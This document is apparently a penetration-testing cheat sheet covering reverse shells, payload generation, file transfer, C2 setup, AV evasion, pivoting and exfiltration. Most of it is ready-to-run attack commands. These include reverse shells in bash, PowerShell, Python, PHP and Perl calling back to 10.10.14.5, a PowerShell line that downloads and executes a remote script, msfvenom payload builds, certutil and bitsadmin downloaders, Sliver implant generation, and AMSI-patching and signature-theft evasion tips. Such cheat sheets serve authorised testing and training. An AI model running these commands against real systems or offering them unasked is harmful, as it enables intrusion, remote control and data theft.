# Payloads, C2, Pivoting & Exfiltration

## 1. Shells

```bash
# Linux
bash -i >& /dev/tcp/10.10.14.5/443 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 443 >/tmp/f
nc -e /bin/sh 10.10.14.5 443
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:443

# Windows
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/a.ps1')"
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# PHP / Python / Perl / Ruby
php -r '$s=fsockopen("10.10.14.5",443);exec("/bin/sh -i <&3 >&3 2>&3");'
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
perl -e 'use Socket;$i="10.10.14.5";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

**Stabilize:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm; stty rows 40 cols 160
```
Or `rlwrap nc -lvnp 443`, or `socat file:$(tty),raw,echo=0 tcp-listen:443`.

## 2. msfvenom

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o s.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o s.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o m.exe
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=443 -f raw -o s.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war -o s.war
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f dll -o s.dll
msfvenom -p windows/x64/exec CMD="calc" -f raw -o sc.bin
```

Encoders (`-e x86/shikata_ga_nai -i 10`) are heavily signatured — prefer custom loaders, `donut`, or `shellter` for AV evasion.

## 3. File transfer

```bash
# Serve
python3 -m http.server 8000
impacket-smbserver share . -smb2support
nc -lvnp 9000 < file
# Fetch
wget/curl -O http://10.10.14.5:8000/x
certutil -urlcache -f http://10.10.14.5/x C:\tmp\x.exe
bitsadmin /transfer j /download /priority normal http://10.10.14.5/x C:\tmp\x.exe
powershell iwr -useb http://10.10.14.5/x -o x.exe
copy \\10.10.14.5\share\x.exe C:\tmp\x.exe
base64 -w0 file   # then echo <b64> | base64 -d > file
```

## 4. C2

| Framework | Notes |
| --- | --- |
| Sliver | Go, mTLS/HTTPS/DNS/WireGuard, multiplayer, BOF support |
| Mythic | Web UI, agent-agnostic, Apollo/Athena/Medusa |
| Havoc | C++ demon, sleep obfuscation, Ekko/Foliage |
| Cobalt Strike | Malleable C2 profiles, BOFs, beacon |
| Metasploit | Fast for CTF, noisy for RT |

```bash
# Sliver
sliver-server
mtls --lhost 0.0.0.0 --lport 8888
generate --mtls c2.example.com --os windows --arch amd64 --save /tmp/impl.exe
https --lhost c2.example.com --lport 443 --domain cdn.example.com
dns --domains c2.example.com
```

**OPSEC baseline:** redirector (nginx/socat) in front, valid TLS cert, domain categorization, sleep 60s + jitter 30%, staged payloads, kill date, per-engagement infra, no shared IPs, no default profiles.

## 5. Evasion (concepts)

- **Loaders:** encrypt shellcode, decrypt at runtime, execute in memory.
- **Injection:** `CreateRemoteThread`, `QueueUserAPC`, `EarlyBird`, process hollowing, module stomping, `NtCreateThreadEx`.
- **Unhooking:** fresh copy of `ntdll` from disk/KnownDlls, direct/indirect syscalls.
- **Sleep obfuscation:** encrypt beacon in memory, change protection (`Ekko`, `Foliage`, `Cronos`).
- **AMSI/ETW:** patch `AmsiScanBuffer`, `EtwEventWrite`; hardware breakpoints.
- **Sandbox checks:** uptime, username, domain, RAM, CPU count, mouse movement, AV processes.
- **Signing:** `sigthief` to steal a valid signature; prefer legit signed binaries as proxies.
- **Packers:** `nimcrypt2`, `amber`, `upx` (badly signatured alone).

## 6. Pivoting

```bash
# SSH
ssh -L 8080:internal:80 user@pivot          # local forward
ssh -R 9001:localhost:9001 user@pivot       # remote forward
ssh -D 1080 -N user@pivot                   # SOCKS
sshuttle -r user@pivot 10.10.10.0/24

# chisel
./chisel server -p 443 --reverse --socks5
./chisel client https://c2:443 R:socks
./chisel client https://c2:443 R:3389:10.10.10.20:3389

# ligolo-ng
ligolo-ng proxy -selfcert -laddr 0.0.0.0:11601
./agent -connect 10.10.14.5:11601 -ignore-cert
# then: interface create, ip route add, session start

# socat
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.10.20:80

# proxychains
proxychains4 -q nmap -sT -Pn -p 445 10.10.10.20
```

DNS tunneling: `dnscat2`, `iodine`. ICMP: `ptunnel`. Through a web shell: use the shell's own host as a relay with `curl`/`wget` chains.

## 7. Exfiltration

- HTTPS to a controlled endpoint, chunked and encrypted.
- DNS TXT/A queries with base64 chunks (`dnscat2`, `iodine`).
- ICMP payloads.
- Cloud storage (S3/GCS) with pre-signed URLs.
- Covert: steganography in images, timing channels.
- Always: smallest possible dataset, hash before/after, log everything, honor the data-handling clause.

## 8. Notes

- Stabilize every shell before running interactive tools.
- Prefer native binaries for transfer on hardened hosts.
- Keep listeners on ports matching the profile (443, 80, 53, 8080).
- Clean up: kill listeners, remove uploaded files, document what remains.
